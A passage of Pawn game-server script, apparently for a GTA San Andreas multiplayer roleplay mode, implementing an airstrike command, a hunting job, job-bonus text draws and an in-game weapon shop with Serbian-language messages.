            else if(turn[playerid] == 2)
            {
                DestroyDynamicObject(stfloor[playerid]);
                stfloor[playerid] = ndfloor[playerid];
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                SetDynamicObjectPos(room[playerid], oX+1.41, oY-0.5, oZ-2.6999511719);
                GetDynamicObjectRot(room[playerid], oX, oY, oZ);
                SetDynamicObjectRot(room[playerid], 0.0, 0.0, oZ+90.0);
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                GetDynamicObjectRot(stfloor[playerid], X, Y, Z);
                ndfloor[playerid] = CreateDynamicObject(3943, oX-3.9, oY+3.3, oZ+4.400024414, 0.0, 0.0, Z+90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
            }
            else if(turn[playerid] == 3)
            {
                DestroyDynamicObject(stfloor[playerid]);
                stfloor[playerid] = ndfloor[playerid];
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                SetDynamicObjectPos(room[playerid], oX+0.5, oY+1.4, oZ-2.6999511719);
                GetDynamicObjectRot(room[playerid], oX, oY, oZ);
                SetDynamicObjectRot(room[playerid], 0.0, 0.0, oZ+90.0);
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                GetDynamicObjectRot(stfloor[playerid], X, Y, Z);
                ndfloor[playerid] = CreateDynamicObject(3943, oX-3.3, oY-3.9, oZ+4.400024414, 0.0, 0.0, Z+90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
                turn[playerid] = -1;
            }
            turn[playerid] ++;
        }
    }
}

forward StandUp(playerid);
public StandUp(playerid)
{
    ApplyAnimation(playerid, "PED", "null", 0.0, 0, 0, 0, 0, 0);
    ApplyAnimation(playerid, "PED", "getup_front", 4.0, 0, 0, 0, 0, 0);

    SetPlayerDrunkLevel(playerid, 0);
    return 1;
}

stock IsPlayerInWater(playerid)
{
    new anim = GetPlayerAnimationIndex(playerid);
    if (((anim >=  1538) && (anim <= 1542)) || (anim == 1544) || (anim == 1250) || (anim == 1062)) return 1;
    return 0;
}

CMD:laser(playerid, params[])
{

    //if(GetPlayerWeapon(playerid) != 31 || GetPlayerWeapon(playerid) != 30) return SendErrorMessage(playerid, "Moras imati oruzije AK47 ili M4 da bi stavio laser!");

    if(GetPVarInt(playerid, "laser") == 0) {

        SetPVarInt(playerid, "laser", 1);
        SendInfoMessage(playerid, "Upalio si laser!");

        return 1;
    }
    else {

        SetPVarInt(playerid, "laser", 0);
        SendInfoMessage(playerid, "Iskljucio si laser!");
        return 1;
    }
}

CMD:airstrike(playerid) {

    if(requestStrike[playerid]) return SendErrorMessage(playerid, "Ne mozes to sada!");
    if(requestStrikeTimer[playerid] != 0) return SendErrorMessage(playerid, "Moras cekati jos %d minuta!", requestStrikeTimer[playerid]);
    if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
    if(NaDmEventu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok si u DM zoni!");
    if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) return SendErrorMessage(playerid, "Moras da cucnes!");

    requestStrike[playerid] = true;
    requestStrikeTime[playerid] = 30;
    requestStrikeTimer[playerid] = 20;
    strikeReady[playerid] = false;

    RemovePlayerAttachedObject(playerid, OBJECT_SLOT_RHAND);
    SetPlayerAttachedObject(playerid, OBJECT_SLOT_RHAND, 19893, 5, 0.475000, 0.034000, -0.144999, -84.499946, -125.199981, 150.700073, 1.000000, 1.000000, 1.000000);

    ApplyAnimation( playerid, "BOMBER", "Plant_Loop",4.0,1,0,0,0,0,1 );
    TogglePlayerControllable(playerid, 0);

    strikeMapTimer = defer strikeMapTime(playerid);

    SendInfoMessage(playerid, "Imas 30 sekundi da oznacis poziciju na mapi sa markerom!");

    return 1;
}

timer strikeMapTime[1000](playerid) {

    if(requestStrikeTime[playerid] != 0 && !strikeReady[playerid]) {

        requestStrikeTime[playerid]--;
        strikeMapTimer = defer strikeMapTime(playerid);
        return 1;
    }
    else {

        requestStrike[playerid] = false;
        requestStrikeTime[playerid] = 0;
        requestStrikeTimer[playerid] = 60;
        strikeReady[playerid] = false;
        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, 1);
        RemovePlayerAttachedObject(playerid, OBJECT_SLOT_RHAND);
        //SendInfoMessage(playerid, "Letelica otkazana!");
    }

    return 1;
}

ptask strikeCheckTime[60000](playerid) {

    if(requestStrikeTimer[playerid] != 0) {

        requestStrikeTimer[playerid] --;
        return 1;
    }

    return 1;
}

timer callStrike[10000](playerid, Float:fX, Float:fY, Float:fZ) {

    if( IsValidObject( StrikeObject[playerid] ) )
        DestroyObject( StrikeObject[playerid] );

    DestroyMapHighlight(highLightID[playerid]);

    StrikeObject[playerid] = CreateObject( 3786, fX, fY, fZ+300, 0, 270, 0, 0 );
    MoveObject( StrikeObject[playerid],  fX, fY, fZ, 70 );

    requestStrike[playerid] = false;
    requestStrikeTime[playerid] = 0;
    strikeReady[playerid] = false;

    return 1;
}

timer secondStrike[1000](Float:x, Float:y, Float:z) {

    for( new created = 0; created < 11 ; created += 1 )
    {
        new Float:explosionPos[2];
        explosionPos[0] = x+random( 30 )-random( 6 );
        explosionPos[1] = y+random( 30 )-random( 6 );
        CreateExplosion( explosionPos[0], explosionPos[1], z, 0, 20.0 );
    }

    return 1;
}

happyJobTDCreate() {

    HappyJobTD[0] = TextDrawCreate(499.500000, 116.500000, "box");
    TextDrawLetterSize(HappyJobTD[0], 0.000000, 0.800000);
    TextDrawTextSize(HappyJobTD[0], 606.000000, 0.000000);
    TextDrawAlignment(HappyJobTD[0], 1);
    TextDrawColor(HappyJobTD[0], 219685375);
    TextDrawUseBox(HappyJobTD[0], 1);
    TextDrawBoxColor(HappyJobTD[0], 219685375);
    TextDrawSetShadow(HappyJobTD[0], 0);
    TextDrawSetOutline(HappyJobTD[0], 0);
    TextDrawBackgroundColor(HappyJobTD[0], 255);
    TextDrawFont(HappyJobTD[0], 1);
    TextDrawSetProportional(HappyJobTD[0], 1);
    TextDrawSetShadow(HappyJobTD[0], 0);

    HappyJobTD[1] = TextDrawCreate(501.500000, 117.375000, "HAPPYJOB");
    TextDrawLetterSize(HappyJobTD[1], 0.139000, 0.558750);
    TextDrawAlignment(HappyJobTD[1], 1);
    TextDrawColor(HappyJobTD[1], -1);
    TextDrawSetShadow(HappyJobTD[1], 0);
    TextDrawSetOutline(HappyJobTD[1], 0);
    TextDrawBackgroundColor(HappyJobTD[1], 255);
    TextDrawFont(HappyJobTD[1], 2);
    TextDrawSetProportional(HappyJobTD[1], 1);
    TextDrawSetShadow(HappyJobTD[1], 0);

    HappyJobTD[2] = TextDrawCreate(539.500000, 117.375000, "PREVOZNIK_DRVECAAA");
    TextDrawLetterSize(HappyJobTD[2], 0.139000, 0.558750);
    TextDrawAlignment(HappyJobTD[2], 1);
    TextDrawColor(HappyJobTD[2], 16711935);
    TextDrawSetShadow(HappyJobTD[2], 0);
    TextDrawSetOutline(HappyJobTD[2], 0);
    TextDrawBackgroundColor(HappyJobTD[2], 255);
    TextDrawFont(HappyJobTD[2], 2);
    TextDrawSetProportional(HappyJobTD[2], 1);
    TextDrawSetShadow(HappyJobTD[2], 0);

    return 1;
}

happyJobPlayerTDControl(playerid, bool:shown) {

    if(!shown) {

        for(new k = 0; k < 3; k ++) {

            TextDrawHideForPlayer(playerid, HappyJobTD[k]);
        }
    }
    else {

        for(new k = 0; k < 3; k ++) {

            TextDrawShowForPlayer(playerid, HappyJobTD[k]);
        }
    }

    return 1;
}

happyJobTDControl(number) {

    foreach(Player, i) {

        for(new k = 0; k < 3; k ++) {

            TextDrawHideForPlayer(i, HappyJobTD[k]);
        }

        new jobName[26];

        switch( number ) {
            case POSAO_NEMA: { jobName = "~r~Iskljucen"; }
            case POSAO_KOSAC: { jobName = "~g~Kosac Trave"; }
            case POSAO_RUDAR: { jobName = "~g~Rudar"; }
            case POSAO_DILER: { jobName = "~g~Diler Droge"; }
            case POSAO_VOJNIK: { jobName = "~g~Vojnik"; }
            case POSAO_DELIVERY: { jobName = "~g~Delivery"; }
            case POSAO_SABOTAZER: { jobName = "~g~Sabotazer"; }
            case POSAO_MOLER: { jobName = "~g~Moler"; }
            case POSAO_HAKER: { jobName = "~g~Haker"; }
            case POSAO_LOVAC: { jobName = "~g~Lovac"; }
            case POSAO_PORNO: { jobName = "~g~Porno Glumica"; }
            case POSAO_ASTRONAUT: { jobName = "~g~Astronaut"; }
            case POSAO_DRVA: { jobName = "~g~Prevoznik Drva"; }
            case POSAO_PILOT: { jobName = "~g~Pilot"; }
            case POSAO_ELEKTRIK: { jobName = "~g~Elektricar"; }
        }

        // new str[64];
        // format(str, sizeof(str), "Happy Job : %s", jobName);
        TextDrawSetString(HappyJobTD[2], jobName);

        for(new k = 0; k < 3; k ++) {

            TextDrawShowForPlayer(i, HappyJobTD[k]);
        }

    }

    return 1;
}

public OnPlayerTakeHuntDrop(playerid,mobid,drop){
    
    if(drop && radiLovac[playerid]){

        lovacBar[playerid] = CreatePlayerProgressBar(playerid, 320.0, 200.0, 80.0, 8.0, 0xcfcaf1FF, 15, BAR_DIRECTION_RIGHT);
        SetPlayerProgressBarValue( playerid, lovacBar[ playerid ], 0.0 );
        ShowPlayerProgressBar( playerid, lovacBar[ playerid ] );

        TogglePlayerControllable(playerid, false);
        ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 1, 0, 0, 0, 0 );
        ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 1, 0, 0, 0, 0 );

        lovacCounter[playerid] = 0;

        defer lovacTimer(playerid);
    }
    return 0; //set drop flag 0
}

timer lovacTimer[1000](playerid) {

    if(lovacCounter[playerid] != 15) {

        lovacCounter[playerid] += 1;
        SetPlayerProgressBarValue(playerid, lovacBar[playerid], lovacCounter[playerid]);

        defer lovacTimer(playerid);

        return 1;
    }
    else {

        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, true);  

        DestroyPlayerProgressBar(playerid, lovacBar[playerid]);
        lovacCounter[playerid] = 0;

        if(ServerInfo[HappyJob] == POSAO_LOVAC) {
            dajPlatuIgracu(playerid, PlataPosla[PLATA_LOVAC] * 2);
            SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
        }
        else dajPlatuIgracu(playerid, PlataPosla[PLATA_LOVAC]);

        SavePlayer(playerid);

        BussinesJobMoney(POSAO_LOVAC, PlataPosla[PLATA_LOVAC]/2);

        SendInfoMessage(playerid, "Uspesno si pokupio kozu i zaradio %d$!", PlataPosla[PLATA_LOVAC]);

        return 1;
    }
}

public OnPlayerKillHuntAnimal(playerid,mobid){
    
    if(radiLovac[playerid]) return SendInfoMessage(playerid, "Ubio si zivotinju! Uzmi joj kozu!");
    
    return 1;
}

public OnPlayerApproachingAnimal(playerid,mobid,mob_state){

    if(mob_state == HUNTING_STATE_DEAD && radiLovac[playerid]){
        SendInfoMessage(playerid, "Pritisni Y da uzmes kozu!");
    }
    
    return 1;
}

public OnAnimalTakeDamage(mobid,playerid,Float:amount,weaponid){
    
    if(!radiLovac[playerid]) return 0;
    if(weaponid != 33) return 0;
    
    return 1;
}

buyGunShow(playerid, number) {

    switch(number) {

        case 0: {

            SetCameraBehindPlayer(playerid);
            TogglePlayerControllable(playerid, true);

            chooseGun[playerid] = 0;

            return 1;
        }

        case 1: { //KALAS

            SendInfoMessage(playerid, "Koristi Y i N za odabir oruzija! SPACE za kupovinu i ALT za izlaz!");
            //SendInfoMessage(playerid, "Oruzije : AK-47 | Cena : 10.000$ | Municija : 60");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 1;

            InterpolateCameraPos(playerid, 2044.594848, -1886.128662, 1001.361877, 2044.594848, -1886.128662, 1001.361877, 3000);
            InterpolateCameraLookAt(playerid, 2044.711669, -1889.473266, 997.647033, 2044.710937, -1889.452880, 997.628784, 3000);

            return 1;
        }

        case 2: { //M4

            //SendInfoMessage(playerid, "Oruzije : M4 | Cena : 10.000$ | Municija : 60");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 2;

            InterpolateCameraPos(playerid, 2043.314331, -1886.005126, 1001.361877, 2043.314331, -1886.005126, 1001.361877, 3000);
            InterpolateCameraLookAt(playerid, 2043.154785, -1889.388427, 997.683837, 2043.099243, -1889.385375, 997.683837, 3000);

            return 1;
        }

        case 3: { //9mm

            //SendInfoMessage(playerid, "Oruzije : 9mm | Cena : 4.000$ | Municija : 20");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 3;

            InterpolateCameraPos(playerid, 2042.380126, -1885.945556, 1001.361877, 2042.380126, -1885.945556, 1001.361877, 3000);
            InterpolateCameraLookAt(playerid, 2042.330444, -1889.411865, 997.758789, 2042.330444, -1889.411865, 997.758789, 3000);

            return 1;
        }

        case 4: { //TEC9

            //SendInfoMessage(playerid, "Oruzije : TEC9 | Cena : 7.000$ | Municija : 60");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 4;

            InterpolateCameraPos(playerid, 2041.657714, -1885.856079, 1001.361877, 2041.657714, -1885.856079, 1001.361877, 3000);
            InterpolateCameraLookAt(playerid, 2041.587158, -1889.419311, 997.854919, 2041.587524, -1889.400024, 997.835510, 3000);

            return 1;
        }

        case 5: { //DEAGLE

            //SendInfoMessage(playerid, "Oruzije : Deagle | Cena : 8.000$ | Municija : 30");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 5;

            InterpolateCameraPos(playerid, 2040.627807, -1886.060913, 1001.173583, 2040.627807, -1886.060913, 1001.173583, 3000);
            InterpolateCameraLookAt(playerid, 2040.655639, -1889.737792, 997.785461, 2040.655639, -1889.737792, 997.785461, 3000);

            return 1;
        }

        // case 6: { //Sniper

        //     //SendInfoMessage(playerid, "Oruzije : Sniper | Cena : 12.000$ | Municija : 20");

        //     TogglePlayerControllable(playerid, true);
        //     chooseGun[playerid] = 6;

        //     InterpolateCameraPos(playerid, 2037.649414, -1888.510375, 1001.138061, 2037.649414, -1888.510375, 1001.138061, 3000);
        //     InterpolateCameraLookAt(playerid, 2041.185302, -1888.759277, 997.611694, 2041.198242, -1888.838378, 997.631103, 3000);

        //     return 1;
        // }

        case 6: { //Palica

            //SendInfoMessage(playerid, "Oruzije : Palica | Cena : 1.000$ | Municija : 1");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 6;

            InterpolateCameraPos(playerid, 2038.936279, -1888.960571, 1000.878356, 2038.936279, -1888.960571, 1000.878356, 3000);
            InterpolateCameraLookAt(playerid, 2039.055053, -1891.901489, 996.836425, 2039.055053, -1891.901489, 996.836425, 3000);

            return 1;
        }

        case 7: { //UZI

            //SendInfoMessage(playerid, "Oruzije : UZI | Cena : 6.000$ | Municija : 60");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 7;

            InterpolateCameraPos(playerid, 2043.417358, -1888.795043, 1000.986755, 2043.417358, -1888.795043, 1000.986755, 3000);
            InterpolateCameraLookAt(playerid, 2047.017578, -1888.910278, 997.518981, 2046.960815, -1888.889038, 997.460388, 3000);

            return 1;
        }

        case 8: { //MP5

            //SendInfoMessage(playerid, "Oruzije : MP5 | Cena : 8.000$ | Municija : 60");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 8;

            InterpolateCameraPos(playerid, 2042.915039, -1889.482788, 1001.489990, 2042.915039, -1889.482788, 1001.489990, 3000);
            InterpolateCameraLookAt(playerid, 2046.568237, -1889.901123, 998.101867, 2046.568237, -1889.901123, 998.101867, 3000);

            return 1;
        }

        case 9: { //Pancir

            //SendInfoMessage(playerid, "Oruzije : Pancir | Cena : 8.000$ | Municija : 100.00");

            TogglePlayerControllable(playerid, true);
            chooseGun[playerid] = 9;

            InterpolateCameraPos(playerid, 2042.550659, -1890.569580, 1001.055480, 2042.550659, -1890.569580, 1001.055480, 3000);
            InterpolateCameraLookAt(playerid, 2046.903686, -1891.458862, 998.761840, 2046.889892, -1891.580322, 998.786193, 3000);

            return 1;
        }
    }

    return 1;
}

giveGunShopGun(playerid, number) {

    switch(number) {

        case 1: {

            if( PlayerInfo[ playerid ][ xNovac ] < 10000) return SendErrorMessage( playerid, "Nemate dovoljno novca 10.000$!");
            DajIgracuNovac( playerid, -10000 );
            GiveWeaponToPlayer( playerid, 30, 60 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio AK-47.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        case 2: {

            if( PlayerInfo[ playerid ][ xNovac ] < 10000) return SendErrorMessage( playerid, "Nemate dovoljno novca 10.000$!");
            DajIgracuNovac( playerid, -10000 );
            GiveWeaponToPlayer( playerid, 31, 60 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio M4.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        case 3: {

            if( PlayerInfo[ playerid ][ xNovac ] < 4000) return SendErrorMessage( playerid, "Nemate dovoljno novca 4.000$!");
            DajIgracuNovac( playerid, -4000 );
            GiveWeaponToPlayer( playerid, 22, 20 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio 9mm.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 700);

            return 1;
        }

        case 4: {

            if( PlayerInfo[ playerid ][ xNovac ] < 7000) return SendErrorMessage( playerid, "Nemate dovoljno novca 7.000$!");
            DajIgracuNovac( playerid, -7000 );
            GiveWeaponToPlayer( playerid, 32, 60 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio TEC9.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        case 5: {

            if( PlayerInfo[ playerid ][ xNovac ] < 8000) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$!");
            DajIgracuNovac( playerid, -8000 );
            GiveWeaponToPlayer( playerid, 24, 30 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio Deagle.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        // case 6: {

        //     if( PlayerInfo[ playerid ][ xNovac ] < 12000) return SendErrorMessage( playerid, "Nemate dovoljno novca 12.000$!");
        //     DajIgracuNovac( playerid, -12000 );
        //     GiveWeaponToPlayer( playerid, 34, 20 );
        //     format( globalstring, sizeof( globalstring ), "* %s je kupio Sniper.", ImeIgraca( playerid ));
        //     PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
        //     BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
        //     BussinesMoney( uFirmi[ playerid ], 1500);

        //     return 1;
        // }

        case 6: {

            if( PlayerInfo[ playerid ][ xNovac ] < 1000) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$!");
            DajIgracuNovac( playerid, -1000 );
            GiveWeaponToPlayer( playerid, 5, 1 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio Palicu.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 500);

            return 1;
        }

        case 7: {

            if( PlayerInfo[ playerid ][ xNovac ] < 6000) return SendErrorMessage( playerid, "Nemate dovoljno novca 6.000$!");
            DajIgracuNovac( playerid, -6000 );
            GiveWeaponToPlayer( playerid, 28, 60 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio UZI.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        case 8: {

            if( PlayerInfo[ playerid ][ xNovac ] < 8000) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$!");
            DajIgracuNovac( playerid, -8000 );
            GiveWeaponToPlayer( playerid, 29, 60 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio MP5.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1500);

            return 1;
        }

        case 9: {

            if( PlayerInfo[ playerid ][ xNovac ] < 8000) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$!");
            DajIgracuNovac( playerid, -8000 );
            Novi_SetPlayerArmour( playerid, 100 );
            format( globalstring, sizeof( globalstring ), "* %s je kupio pancir.", ImeIgraca( playerid ));
            PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
            BussinesMoney( uFirmi[ playerid ], 1000);

            return 1;
        }
    }

    return 1;
}

buyGunTDCreate(playerid) {

    BuyGunTD[playerid][0] = CreatePlayerTextDraw(playerid, 240.416671, 305.111083, "box");
    PlayerTextDrawLetterSize(playerid, BuyGunTD[playerid][0], 0.000000, 7.708333);
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][0], 401.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, BuyGunTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, BuyGunTD[playerid][0], -235616538);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][0], 1);

    BuyGunTD[playerid][1] = CreatePlayerTextDraw(playerid, 247.916687, 306.148132, "Oruzije : ~r~AK-47");
    PlayerTextDrawLetterSize(playerid, BuyGunTD[playerid][1], 0.248750, 1.636295);
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][1], 746.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][1], -2088927745);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][1], 1);

    BuyGunTD[playerid][2] = CreatePlayerTextDraw(playerid, 247.916671, 321.185150, "Municija : ~r~60");
    PlayerTextDrawLetterSize(playerid, BuyGunTD[playerid][2], 0.248750, 1.636295);
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][2], 746.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][2], -2088927745);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][2], 1);

    BuyGunTD[playerid][3] = CreatePlayerTextDraw(playerid, 247.916671, 337.259277, "Cena : ~r~10.000$");
    PlayerTextDrawLetterSize(playerid, BuyGunTD[playerid][3], 0.248750, 1.636295);
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][3], 746.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][3], -2088927745);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][3], 1);

    BuyGunTD[playerid][4] = CreatePlayerTextDraw(playerid, 275.416656, 358.518524, "~r~Pritisnite 'SPACE' za kupovinu");
    PlayerTextDrawLetterSize(playerid, BuyGunTD[playerid][4], 0.187083, 1.605183);
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][4], 746.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][4], -2088927745);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][4], 1);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][4], 1);

    BuyGunTD[playerid][5] = CreatePlayerTextDraw(playerid, 334.999786, 296.037170, "");
    PlayerTextDrawTextSize(playerid, BuyGunTD[playerid][5], 78.000000, 115.000000);
    PlayerTextDrawAlignment(playerid, BuyGunTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, BuyGunTD[playerid][5], -1);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][5], 0x00000000);
    PlayerTextDrawSetShadow(playerid, BuyGunTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, BuyGunTD[playerid][5], 1090519040);
    PlayerTextDrawFont(playerid, BuyGunTD[playerid][5], 5);
    PlayerTextDrawSetProportional(playerid, BuyGunTD[playerid][5], 0);
    PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 355);
    PlayerTextDrawSetPreviewRot(playerid, BuyGunTD[playerid][5], 0.000000, -30.000000, 0.000000, 2.000000);

    return 1;
}

buyGunTDShow(playerid, number) {

    switch(number) {

        case 0: {

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawHide(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 1: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~AK-47");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~60");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~10.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 355);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 2: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~M4");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~60");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~10.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 356);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 3: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~9mm");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~20");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~4.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 346);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 4: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~TEC9");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~60");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~7.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 372);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 5: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~Deagle");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~30");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~8.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 348);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        // case 6: {

        //     buyGunTDShow(playerid, 0);

        //     PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~Sniper");
        //     PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~20");
        //     PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~12.000$");

        //     PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 358);

        //     for(new i = 0; i < 6; i++) {

        //         PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
        //     }
        //     return 1;
        // }
        case 6: {

            buyGunTDShow(playerid, 0);

